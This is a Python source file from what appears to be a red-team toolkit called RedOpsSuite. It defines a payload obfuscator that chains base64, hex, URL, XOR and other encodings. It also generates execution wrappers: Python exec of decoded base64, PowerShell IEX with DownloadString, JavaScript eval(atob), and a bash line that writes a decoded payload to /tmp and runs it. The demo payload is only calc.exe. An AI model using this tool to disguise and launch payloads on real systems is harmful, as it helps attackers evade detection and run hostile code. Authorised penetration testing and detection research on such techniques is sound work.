# RedOpsSuite/modules/obfuscator.py
import base64
import binascii
import html
import codecs
import urllib.parse
import json
import logging
import random
import string

# --- Setup basic logging for standalone execution ---
logger = logging.getLogger(__name__)
logger.propagate = False
logger.setLevel(logging.DEBUG)
if not logger.handlers:
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    ch.setFormatter(formatter)
    logger.addHandler(ch)
# --- End logging setup ---

class Obfuscator:
    """
    A basic payload obfuscation tool for RedOpsSuite.
    Supports various encoding, simple encryption, and wrapper generation.
    """

    def __init__(self):
        """
        Initializes the Obfuscator.
        """
        self.supported_encodings = [
            'base64', 'hex', 'url', 'html_entity', 'unicode_escape',
            'rot13', 'xor_simple', 'double_base64', 'double_url'
        ]
        logger.info("Obfuscator module initialized.")

    def _apply_encoding(self, payload_bytes, encoding_type, **kwargs):
        """
        Applies a single encoding/obfuscation technique to bytes.

        Args:
            payload_bytes (bytes): The payload to encode.
            encoding_type (str): The type of encoding/obfuscation.
            **kwargs: Additional arguments for specific encodings (e.g., 'key' for xor).

        Returns:
            tuple: (encoded_string, metadata_dict) or (None, error_message) on failure.
        """
        metadata = {"encoding": encoding_type, "steps": []}
        try:
            if encoding_type == 'base64':
                encoded_bytes = base64.b64encode(payload_bytes)
                result_str = encoded_bytes.decode('ascii')
                metadata["steps"].append(f"Base64 encoded bytes: {len(payload_bytes)} -> {len(encoded_bytes)} chars")
                return result_str, metadata

            elif encoding_type == 'hex':
                result_str = payload_bytes.hex()
                metadata["steps"].append(f"Hex encoded bytes: {len(payload_bytes)} -> {len(result_str)} chars")
                return result_str, metadata

            elif encoding_type == 'url':
                # URL encode the *bytes* (treating each byte as a char)
                # This is different from urllib.parse.quote which works on strings.
                # For binary data, hex encoding is more common. But for text...
                # Let's assume payload_bytes is UTF-8 text for URL encoding.
                try:
                    payload_text = payload_bytes.decode('utf-8')
                    result_str = urllib.parse.quote_plus(payload_text) # quote_plus encodes spaces as +
                    metadata["steps"].append(f"URL (+) encoded string: {len(payload_text)} -> {len(result_str)} chars")
                    return result_str, metadata
                except UnicodeDecodeError:
                    # If it's binary, hex might be better, or we encode each byte
                    logger.warning("Obfuscator: URL encoding requested for non-UTF8 bytes. Encoding individual bytes as %XX.")
                    parts = [f"%{byte:02X}" for byte in payload_bytes]
                    result_str = "".join(parts)
                    metadata["steps"].append(f"URL encoded bytes individually: {len(payload_bytes)} -> {len(result_str)} chars")
                    return result_str, metadata

            elif encoding_type == 'html_entity':
                 # Encode characters as HTML entities (works best for text)
                 try:
                     payload_text = payload_bytes.decode('utf-8')
                     result_str = html.escape(payload_text, quote=True)
                     metadata["steps"].append(f"HTML entity encoded string: {len(payload_text)} -> {len(result_str)} chars")
                     return result_str, metadata
                 except UnicodeDecodeError:
                     logger.warning("Obfuscator: HTML entity encoding requested for non-UTF8 bytes. Skipping.")
                     return None, "HTML entity encoding requires UTF-8 text."

            elif encoding_type == 'unicode_escape':
                # Encode as unicode escape sequences (e.g., \u0041 for 'A')
                try:
                    payload_text = payload_bytes.decode('utf-8')
                    result_str = payload_text.encode('unicode_escape').decode('ascii')
                    metadata["steps"].append(f"Unicode escaped string: {len(payload_text)} -> {len(result_str)} chars")
                    return result_str, metadata
                except UnicodeDecodeError:
                    logger.warning("Obfuscator: Unicode escape encoding requested for non-UTF8 bytes. Skipping.")
                    return None, "Unicode escape encoding requires UTF-8 text."

            elif encoding_type == 'rot13':
                 # ROT13 (only really works for ASCII letters)
                 try:
                     payload_text = payload_bytes.decode('utf-8')
                     result_str = codecs.encode(payload_text, 'rot_13')
                     metadata["steps"].append(f"ROT13 encoded string: {len(payload_text)} -> {len(result_str)} chars")
                     return result_str, metadata
                 except (UnicodeDecodeError, UnicodeError):
                     logger.warning("Obfuscator: ROT13 encoding requested for non-UTF8/unsupported chars. Skipping.")
                     return None, "ROT13 encoding requires UTF-8 text compatible with ROT13."

            elif encoding_type == 'xor_simple':
                key = kwargs.get('key')
                if not key:
                    # Generate a random single-byte key if not provided
                    key = random.randint(1, 255)
                    metadata['generated_key'] = key
                    logger.debug(f"Obfuscator: Generated random XOR key: {key}")

                if isinstance(key, int) and 0 <= key <= 255:
                    key_byte = key
                elif isinstance(key, str) and len(key) == 1:
                    key_byte = ord(key)
                else:
                    return None, f"Invalid XOR key: {key}. Must be an int (0-255) or single-char string."

                xored_bytes = bytes([b ^ key_byte for b in payload_bytes])
                metadata["steps"].append(f"XORed bytes with key {key_byte}: {len(payload_bytes)} bytes")
                # Often, XORed data is then Base64 encoded for transport/storage
                return xored_bytes, metadata # Return bytes, caller can decide to B64 encode

            elif encoding_type.startswith('double_'):
                # Placeholder for chained encodings. A full implementation would recursively call _apply_encoding
                # or have specific logic. For now, treat as unsupported in this simple function.
                # Chained encodings are better handled by the main obfuscate method.
                return None, f"Chained encoding '{encoding_type}' not supported in _apply_encoding. Use main obfuscate() method."

            else:
                return None, f"Unsupported encoding type in _apply_encoding: {encoding_type}"

        except Exception as e:
            error_msg = f"Error applying {encoding_type}: {str(e)}"
            logger.error(f"Obfuscator: {error_msg}")
            return None, error_msg

    def obfuscate(self, payload, techniques, wrapper=None, **wrapper_kwargs):
        """
        Obfuscates a payload string using specified techniques and optionally wraps it.

        Args:
            payload (str): The plaintext payload string.
            techniques (list or str): A list of encoding techniques or a single technique string.
                                       Supported: 'base64', 'hex', 'url', 'html_entity', 'unicode_escape',
                                                  'rot13', 'xor_simple', 'double_base64', 'double_url'.
            wrapper (str, optional): A wrapper template to put the obfuscated payload into.
                                     Placeholders like {encoded_payload} or {original_payload} can be used.
                                     Example: 'eval(base64_decode("{encoded_payload}"))'
            **wrapper_kwargs: Additional keyword arguments for the wrapper (e.g., specific keys for xor).

        Returns:
            dict: A dictionary containing the original payload, final obfuscated string,
                  list of applied techniques with metadata, and any errors.
        """
        if isinstance(techniques, str):
            techniques = [techniques]

        result = {
            "original_payload": payload,
            "final_obfuscated": payload, # Start with original
            "applied_techniques": [],
            "wrapper_used": wrapper,
            "errors": []
        }

        payload_bytes = payload.encode('utf-8')

        current_data = payload_bytes # Start with bytes
        current_encoding_chain = []

        for technique in techniques:
            logger.debug(f"Obfuscator: Applying technique '{technique}'...")
            # Handle chained encodings specially within the loop
            if technique == 'double_base64':
                # Apply Base64 twice
                intermediate_result, meta1 = self._apply_encoding(current_data, 'base64')
                if intermediate_result is None:
                    result["errors"].append(meta1)
                    logger.error(f"Obfuscator: Failed intermediate step for {technique}: {meta1}")
                    break # Stop on error
                current_data = intermediate_result.encode('utf-8') # Encode intermediate string back to bytes
                current_encoding_chain.append(meta1)

                final_result, meta2 = self._apply_encoding(current_data, 'base64')
                if final_result is None:
                    result["errors"].append(meta2)
                    logger.error(f"Obfuscator: Failed final step for {technique}: {meta2}")
                    break
                current_data = final_result.encode('utf-8')
                current_encoding_chain.append(meta2)
                result["applied_techniques"].extend(current_encoding_chain)
                result["final_obfuscated"] = final_result
                logger.info(f"Obfuscator: Applied chained technique '{technique}'.")

            elif technique == 'double_url':
                # Apply URL encoding twice
                intermediate_result, meta1 = self._apply_encoding(current_data, 'url')
                if intermediate_result is None:
                    result["errors"].append(meta1)
                    logger.error(f"Obfuscator: Failed intermediate step for {technique}: {meta1}")
                    break
                current_data = intermediate_result.encode('utf-8')
                current_encoding_chain.append(meta1)

                final_result, meta2 = self._apply_encoding(current_data, 'url')
                if final_result is None:
                    result["errors"].append(meta2)
                    logger.error(f"Obfuscator: Failed final step for {technique}: {meta2}")
                    break
                current_data = final_result.encode('utf-8')
                current_encoding_chain.append(meta2)
                result["applied_techniques"].extend(current_encoding_chain)
                result["final_obfuscated"] = final_result
                logger.info(f"Obfuscator: Applied chained technique '{technique}'.")

            elif technique == 'xor_simple':
                 # Handle XOR, which returns bytes
                 xor_key = wrapper_kwargs.get('xor_key') # Get key from wrapper_kwargs if provided for xor
                 xor_result_bytes, meta = self._apply_encoding(current_data, 'xor_simple', key=xor_key)
                 if xor_result_bytes is None:
                     result["errors"].append(meta)
                     logger.error(f"Obfuscator: Failed technique {technique}: {meta}")
                     break
                 # XOR result is bytes, often B64 encoded next. For final output, let's B64 encode it.
                 # A real impl might allow raw bytes output or further chaining.
                 b64_result, b64_meta = self._apply_encoding(xor_result_bytes, 'base64')
                 if b64_result is None:
                      result["errors"].append(b64_meta)
                      logger.error(f"Obfuscator: Failed B64 encoding after XOR: {b64_meta}")
                      break
                 current_data = b64_result.encode('utf-8') # Encode B64 string to bytes for consistency if further steps
                 result["applied_techniques"].append({**meta, "post_xor_b64": True})
                 result["applied_techniques"].append(b64_meta)
                 result["final_obfuscated"] = b64_result # Final output is the B64 string of XORed data
                 logger.info(f"Obfuscator: Applied technique '{technique}' (XOR -> B64).")

            else:
                # Apply single encoding
                encoded_result_str, meta = self._apply_encoding(current_data, technique)
                if encoded_result_str is None:
                    result["errors"].append(meta)
                    logger.error(f"Obfuscator: Failed technique {technique}: {meta}")
                    break # Stop on error

                result["applied_techniques"].append(meta)
                result["final_obfuscated"] = encoded_result_str
                # Prepare data for next iteration (assume output is a UTF-8 string unless it's bytes like XOR)
                if isinstance(encoded_result_str, str):
                    current_data = encoded_result_str.encode('utf-8')
                else: # This case mainly for XOR returning bytes directly
                    current_data = encoded_result_str
                logger.info(f"Obfuscator: Applied technique '{technique}'.")

        # --- Apply Wrapper ---
        if wrapper and not result["errors"]:
            try:
                # The wrapped payload will be a string
                # Use format() with safe_substitute-like behavior or manual replacement
                # This is basic. A full templating engine (like Jinja2) would be more robust.
                final_payload_str = result["final_obfuscated"]
                original_payload_str = result["original_payload"]

                # Simple placeholder replacement
                wrapped_payload = wrapper.replace("{encoded_payload}", final_payload_str)
                wrapped_payload = wrapped_payload.replace("{original_payload}", original_payload_str)
                # Add more placeholders if needed (e.g., keys for XOR if stored in metadata)

                result["final_obfuscated"] = wrapped_payload
                logger.info("Obfuscator: Applied wrapper to final obfuscated payload.")
            except Exception as e:
                error_msg = f"Error applying wrapper: {str(e)}"
                result["errors"].append(error_msg)
                logger.error(f"Obfuscator: {error_msg}")

        logger.info(f"Obfuscator: Completed obfuscation. Applied {len(result['applied_techniques'])} techniques.")
        return result

    def generate_wrapper(self, language='python', payload_holder='{encoded_payload}'):
        """
        Generates a basic execution wrapper for common languages.
        This is a simplified example. Real wrappers are much more complex and context-dependent.

        Args:
            language (str): Target language ('python', 'powershell', 'javascript', 'bash').
            payload_holder (str): The placeholder for the encoded payload in the generated code.

        Returns:
            str: A string containing the wrapper code.
        """
        wrappers = {
            'python': f"import base64; exec(base64.b64decode('{payload_holder}'))",
            'python_hex': f"import binascii; exec(binascii.unhexlify('{payload_holder}'))",
            'powershell': f"IEX (New-Object Net.WebClient).DownloadString('data:text/plain;base64,{payload_holder}')", # PS download & execute B64
            'powershell_iex': f"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_holder}')))",
            'javascript': f"eval(atob('{payload_holder}'));", # JS atob for B64
            'bash': f"echo '{payload_holder}' | base64 -d > /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh", # B64 decode & exec bash
            # Add more as needed
        }
        wrapper_code = wrappers.get(language.lower(), f"# No standard wrapper for language: {language}\necho {payload_holder}")
        logger.debug(f"Obfuscator: Generated {language} wrapper.")
        return wrapper_code

    def list_techniques(self):
        """Returns a list of supported obfuscation techniques."""
        logger.debug("Obfuscator: Listed supported techniques.")
        return self.supported_encodings


# Example usage (if run directly)
if __name__ == '__main__':
    obfuscator = Obfuscator()

    # Example payload (a simple command)
    test_payload = "calc.exe" # Example Windows command
    print("--- Obfuscator Basic Demo ---")
    print(f"Original Payload: {test_payload}")
    print("-" * 30)

    # 1. Test single encoding
    print("\n1. Testing Single Base64 Encoding:")
    result_b64 = obfuscator.obfuscate(test_payload, techniques=['base64'])
    print(f"Obfuscated (B64): {result_b64['final_obfuscated']}")
    print(f"Techniques Applied: {[t.get('encoding') for t in result_b64['applied_techniques']]}")
    if result_b64['errors']:
        print(f"Errors: {result_b64['errors']}")

    # 2. Test chained encoding
    print("\n2. Testing Chained Encoding (Double Base64):")
    result_double_b64 = obfuscator.obfuscate(test_payload, techniques=['double_base64'])
    print(f"Obfuscated (Double B64): {result_double_b64['final_obfuscated']}")
    print(f"Techniques Applied: {[t.get('encoding') for t in result_double_b64['applied_techniques']]}")
    if result_double_b64['errors']:
        print(f"Errors: {result_double_b64['errors']}")

    # 3. Test XOR + Base64
    print("\n3. Testing XOR (key=0xAA) + Base64:")
    result_xor_b64 = obfuscator.obfuscate(test_payload, techniques=['xor_simple'], xor_key=0xAA)
    print(f"Obfuscated (XOR+B64): {result_xor_b64['final_obfuscated']}")
    print(f"Techniques Applied: {[t.get('encoding') for t in result_xor_b64['applied_techniques']]}")
    if result_xor_b64['errors']:
        print(f"Errors: {result_xor_b64['errors']}")

    # 4. Test with a wrapper
    print("\n4. Testing Base64 Encoding with Python Wrapper:")
    result_wrapped = obfuscator.obfuscate(
        test_payload,
        techniques=['base64'],
        wrapper=obfuscator.generate_wrapper('python') # Get standard Python B64 wrapper
    )
    print(f"Final Wrapped Payload:\n{result_wrapped['final_obfuscated']}")
    print(f"Wrapper Used: {result_wrapped['wrapper_used']}")
    if result_wrapped['errors']:
        print(f"Errors: {result_wrapped['errors']}")

    # 5. List techniques
    print("\n5. Supported Techniques:")
    techniques = obfuscator.list_techniques()
    for tech in techniques:
        print(f" - {tech}")

    print("-" * 30)
    print("Obfuscator demo completed.")
